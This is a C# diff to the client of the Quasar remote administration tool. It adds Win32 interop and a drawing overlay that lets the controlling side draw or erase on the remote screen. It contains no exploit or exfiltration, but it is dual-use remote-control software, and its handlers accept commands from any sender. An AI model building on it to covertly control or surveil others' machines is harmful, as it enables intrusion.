@@ -16,13 +16,184 @@ using Quasar.Common.Messages.other;
 using System.Collections.Concurrent;
 using System.Runtime.InteropServices;
 using Quasar.Client.Config;
+using System.Collections.Generic;
+using Quasar.Client.Utilities;
+using System.Linq;
 
 namespace Quasar.Client.Messages
 {
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    public struct WNDCLASS
+    {
+        public uint style;
+        public WndProcDelegate lpfnWndProc;
+        public int cbClsExtra;
+        public int cbWndExtra;
+        public IntPtr hInstance;
+        public IntPtr hIcon;
+        public IntPtr hCursor;
+        public IntPtr hbrBackground;
+        [MarshalAs(UnmanagedType.LPStr)]
+        public string lpszMenuName;
+        [MarshalAs(UnmanagedType.LPStr)]
+        public string lpszClassName;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct BLENDFUNCTION
+    {
+        public byte BlendOp;
+        public byte BlendFlags;
+        public byte SourceConstantAlpha;
+        public byte AlphaFormat;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct POINT
+    {
+        public int x;
+        public int y;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SIZE
+    {
+        public int cx;
+        public int cy;
+    }
+
+    public delegate IntPtr WndProcDelegate(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
+
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
     {
+        #region P/Invoke
+        
         [DllImport("user32.dll", SetLastError = true)]
         private static extern bool SetThreadDesktop(IntPtr hDesktop);
+        
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetDC(IntPtr hwnd);
+
+        [DllImport("user32.dll")]
+        public static extern bool ReleaseDC(IntPtr hwnd, IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        static extern bool DeleteDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+
+        [DllImport("gdi32.dll")]
+        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+
+        [DllImport("gdi32.dll")]
+        static extern bool DeleteObject(IntPtr hObject);
+
+        [DllImport("gdi32.dll")]
+        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
+
+        [DllImport("user32.dll")]
+        static extern bool UpdateLayeredWindow(IntPtr hwnd, IntPtr hdcDst, ref POINT pptDst, ref SIZE psize, IntPtr hdcSrc, ref POINT pptSrc, uint crKey, ref BLENDFUNCTION pblend, uint dwFlags);
+
+        [DllImport("user32.dll")]
+        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
+
+        [DllImport("user32.dll")]
+        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+
+        [DllImport("user32.dll")]
+        static extern bool DestroyWindow(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern IntPtr CreateWindowEx(uint dwExStyle, string lpClassName, string lpWindowName, uint dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, IntPtr hMenu, IntPtr hInstance, IntPtr lpParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr DefWindowProc(IntPtr hWnd, uint uMsg, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern System.UInt16 RegisterClassEx([In] ref WNDCLASSEX lpwcx);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetDesktopWindow();
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct POINT
+        {
+            public int x;
+            public int y;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct SIZE
+        {
+            public int cx;
+            public int cy;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        struct BLENDFUNCTION
+        {
+            public byte BlendOp;
+            public byte BlendFlags;
+            public byte SourceConstantAlpha;
+            public byte AlphaFormat;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        struct WNDCLASSEX
+        {
+            [MarshalAs(UnmanagedType.U4)]
+            public int cbSize;
+            [MarshalAs(UnmanagedType.U4)]
+            public int style;
+            public IntPtr lpfnWndProc;
+            public int cbClsExtra;
+            public int cbWndExtra;
+            public IntPtr hInstance;
+            public IntPtr hIcon;
+            public IntPtr hCursor;
+            public IntPtr hbrBackground;
+            public string lpszMenuName;
+            public string lpszClassName;
+            public IntPtr hIconSm;
+        }
+
+        // Constants
+        private const int GWL_EXSTYLE = -20;
+        private const int WS_EX_LAYERED = 0x80000;
+        private const int WS_EX_TRANSPARENT = 0x20;
+        private const int WS_EX_TOPMOST = 0x8;
+        private const int WS_EX_TOOLWINDOW = 0x80;
+        private const uint WS_VISIBLE = 0x10000000;
+        private const uint WS_POPUP = 0x80000000;
+        private const int SW_SHOWNOACTIVATE = 4;
+        private const int HWND_TOPMOST = -1;
+        private const uint SWP_NOACTIVATE = 0x0010;
+        private const uint SWP_SHOWWINDOW = 0x0040;
+        private const uint ULW_ALPHA = 0x00000002;
+        private const byte AC_SRC_OVER = 0x00;
+        private const byte AC_SRC_ALPHA = 0x01;
+        private const uint SRCCOPY = 0x00CC0020;
+        private const int LWA_COLORKEY = 0x1;
+        private const int LWA_ALPHA = 0x2;
+        private const uint WM_DESTROY = 0x0002;
+        
+        #endregion
 
         private UnsafeStreamCodec _streamCodec;
         private BitmapData _desktopData = null;
@@ -31,21 +202,31 @@ namespace Quasar.Client.Messages
         private ISender _clientMain;
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
+        private bool _delegateInitialized = false;
+
+        private ScreenOverlay _screenOverlay = new ScreenOverlay();
+        private WndProcDelegate _wndProcDelegate;
 
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
         private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
         private int _pendingFrameRequests = 0;
 
-        // max buffer size to prevent memory issues
         private const int MAX_BUFFER_SIZE = 10;
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
 
+        // drawing commands
+        private readonly ConcurrentQueue<Action> _drawingQueue = new ConcurrentQueue<Action>();
+        private readonly ManualResetEvent _drawingSignal = new ManualResetEvent(false);
+        private Thread _drawingThread;
+        private bool _drawingThreadRunning = false;
+
         public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                              message is DoMouseEvent ||
                                                              message is DoKeyboardEvent ||
+                                                             message is DoDrawingEvent ||
                                                              message is GetMonitors;
 
         public override bool CanExecuteFrom(ISender sender) => true;
@@ -63,9 +244,58 @@ namespace Quasar.Client.Messages
                 case DoKeyboardEvent msg:
                     Execute(sender, msg);
                     break;
+                case DoDrawingEvent msg:
+                    _drawingQueue.Enqueue(() => Execute(sender, msg));
+                    _drawingSignal.Set();
+                    EnsureDrawingThreadIsRunning();
+                    break;
                 case GetMonitors msg:
                     Execute(sender, msg);
                     break;
+            }
+        }
+
+        private void EnsureDrawingThreadIsRunning()
+        {
+            if (!_drawingThreadRunning)
+            {
+                _drawingThreadRunning = true;
+                _drawingThread = new Thread(DrawingThreadProc);
+                _drawingThread.IsBackground = true;
+                _drawingThread.Start();
+            }
+        }
+
+        private void DrawingThreadProc()
+        {
+            try
+            {
+                while (_drawingThreadRunning)
+                {
+                    _drawingSignal.WaitOne();
+
+                    while (_drawingQueue.TryDequeue(out Action drawAction))
+                    {
+                        try
+                        {
+                            drawAction();
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error processing drawing action: {ex.Message}");
+                        }
+                    }
+
+                    _drawingSignal.Reset();
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error in drawing thread: {ex.Message}");
+            }
+            finally
+            {
+                _drawingThreadRunning = false;
             }
         }
 
@@ -353,6 +583,35 @@ namespace Quasar.Client.Messages
                 Debug.WriteLine($"Error executing keyboard event: {ex.Message}");
             }
         }
+        
+        private void Execute(ISender sender, DoDrawingEvent message)
+        {
+            try
+            {
+                if (message.IsClearAll)
+                {
+                    _screenOverlay.ClearDrawings(message.MonitorIndex);
+                }
+                else if (message.IsEraser)
+                {
+                    _screenOverlay.DrawEraser(
+                        message.PrevX, message.PrevY,
+                        message.X, message.Y,
+                        message.StrokeWidth, message.MonitorIndex);
+                }
+                else
+                {
+                    _screenOverlay.Draw(
+                        message.PrevX, message.PrevY,
+                        message.X, message.Y,
+                        message.StrokeWidth, message.ColorArgb, message.MonitorIndex);
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing drawing event: {ex.Message}");
+            }
+        }
 
         private void Execute(ISender client, GetMonitors message)
         {
@@ -370,10 +629,6 @@ namespace Quasar.Client.Messages
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-            StopScreenStreaming();
-            _streamCodec?.Dispose();
-            _cancellationTokenSource?.Dispose();
-            _frameRequestEvent?.Dispose();
         }
 
         protected virtual void Dispose(bool disposing)
@@ -384,6 +639,15 @@ namespace Quasar.Client.Messages
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
                 _frameRequestEvent?.Dispose();
+                
+                _drawingThreadRunning = false;
+                _drawingSignal.Set();
+                if (_drawingThread != null && _drawingThread.IsAlive)
+                {
+                    _drawingThread.Join(1000);
+                }
+                _drawingSignal.Dispose();
+                _screenOverlay?.Dispose();
             }
         }
     }
